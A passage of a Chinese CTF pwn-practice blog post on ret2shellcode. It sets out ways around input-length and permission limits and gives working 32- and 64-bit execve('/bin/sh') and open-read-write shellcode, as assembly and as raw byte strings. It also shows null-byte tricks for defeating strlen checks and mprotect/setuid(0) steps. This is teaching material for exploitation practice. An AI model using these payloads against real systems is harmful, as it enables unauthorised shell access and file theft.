+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="一-限制输入长度"><a href="#一-限制输入长度" class="headerlink" title="一.限制输入长度"></a>一.限制输入长度</h4><ol>
+<li><p><strong>利用短字节shellcode(32位)</strong></p>
+<p><code>getshell</code> - 21字节</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># (execve(&quot;/bin/sh&quot;,NULL,NULL))</span><br>shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x68732f</span><br><span class="hljs-string">    push 0x6e69622f</span><br><span class="hljs-string">    mov ebx,esp</span><br><span class="hljs-string">    xor ecx,ecx</span><br><span class="hljs-string">    xor edx,edx</span><br><span class="hljs-string">    push 11</span><br><span class="hljs-string">    pop eax</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></div>
+
+<p><code>orw</code> - 56字节</p>
+<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    /*open(./flag)*/</span><br><span class="hljs-string">    push 0x1010101</span><br><span class="hljs-string">    xor dword ptr [esp], 0x1016660</span><br><span class="hljs-string">    push 0x6c662f2e</span><br><span class="hljs-string">    mov eax,0x5</span><br><span class="hljs-string">    mov ebx,esp</span><br><span class="hljs-string">    xor ecx,ecx</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">    /*read(fd,buf,0x100)*/</span><br><span class="hljs-string">    mov ebx,eax</span><br><span class="hljs-string">    mov ecx,esp</span><br><span class="hljs-string">    mov edx,0x30</span><br><span class="hljs-string">    mov eax,0x3</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">    /*write(1,buf,0x100)*/</span><br><span class="hljs-string">    mov ebx,0x1</span><br><span class="hljs-string">    mov eax,0x4</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></div>
+
+<p>无<code>\x00</code>截断<code>getshell</code> - 21字节</p>
+<div class="code-container" data-rel="Moonscript"><figure class="iseeu highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80<br></code></pre></td></tr></table></figure></div>
+
+<p><code>scanf</code>可读取<code>getshell</code> - 41字节</p>
+<div class="code-container" data-rel="Moonscript"><figure class="iseeu highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh<br></code></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>利用短字节shellcode(64位)</strong></p>
+<p><code>getshell</code> - 22字节</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi,esi</span><br><span class="hljs-string">    xor edx,edx</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></div>
+
+<p><code>orw</code> - 43字节</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x67616c66</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    xor esi,esi</span><br><span class="hljs-string">    push 2</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi,rax</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    mov edx,0x100</span><br><span class="hljs-string">    xor eax,eax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,1</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></div>
+
+<p>无<code>\x00</code>截断、<code>scanf</code>可读 - 22字节</p>
+<div class="code-container" data-rel="Moonscript"><figure class="iseeu highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<br></code></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>\x00截断绕过长度判断</strong></p>
+<p>当题目采用<code>strlen</code>来进行<code>shellcode</code>的长度检测时，可以在其前面加<code>\x00</code>开头的指令绕过长度检测。以下为64位的指令：</p>
+<div class="code-container" data-rel="Basic"><figure class="iseeu highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span><span class="hljs-number">40</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rax+<span class="hljs-number">0</span>x0],  al<br><span class="hljs-symbol">00 </span><span class="hljs-number">41</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rcx+<span class="hljs-number">0</span>x0],  al<br><span class="hljs-symbol">00 </span><span class="hljs-number">42</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rdx+<span class="hljs-number">0</span>x0],  al<br><span class="hljs-symbol">00 </span><span class="hljs-number">43</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rbx+<span class="hljs-number">0</span>x0],  al<br><span class="hljs-symbol">00 </span><span class="hljs-number">45</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rbp+<span class="hljs-number">0</span>x0],  al<br><span class="hljs-symbol">00 </span><span class="hljs-number">46</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rsi+<span class="hljs-number">0</span>x0],  al<br><span class="hljs-symbol">00 </span><span class="hljs-number">47</span> <span class="hljs-number">00</span>                 add    BYTE PTR [rdi+<span class="hljs-number">0</span>x0],  al<br></code></pre></td></tr></table></figure></div>
+
+<p>ps:也可直接<code>\x00\x00</code>绕过</p>
+</li>
+</ol>
+<h4 id="二-限制权限"><a href="#二-限制权限" class="headerlink" title="二.限制权限"></a>二.限制权限</h4><ol>
+<li><p><strong>限制shellcode无读写权限</strong></p>
+<p>利用<code>mprotect</code>给予读写权限，并再次利用<code>read</code>写入执行</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">mprotect用法<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span></span>;<br></code></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>限制远程读flag权限</strong></p>
+<p>先执行<code>setuid(0)</code>，再执行<code>execve</code>来进行<code>getshell</code>。</p>
+</li>
+</ol>
+<!--more-->
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> PWN练习之ret2shellcode</li>
+        <li><strong>作者:</strong> The Redefine Team</li>
+        <li><strong>创建于
+                :</strong> 2025-11-05 00:00</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-11-06 00:27
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2025/11/05/PWN练习之ret2shellcode/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/CTF%E8%B5%9B%E9%A2%98/">#CTF赛题</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">#CTF基础知识</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="../../01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">?CTF2025 week4部分WP</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '../../../../js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">PWN练习之ret2shellcode</div>
+		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84exp%E5%A7%BF%E5%8A%BF"><span class="nav-text">可能的exp姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="nav-text">绕过限制</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 19 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="js/build/libs/Swup.min.js"></script>
+
+<script src="js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="js/build/utils.js" type="module"></script>
+
+<script src="js/build/main.js" type="module"></script>
+
+<script src="js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="js/build/tools/runtime.js"></script>
+
+    
+<script src="js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="js/build/libs/Typed.min.js"></script>
+
+  
+<script src="js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
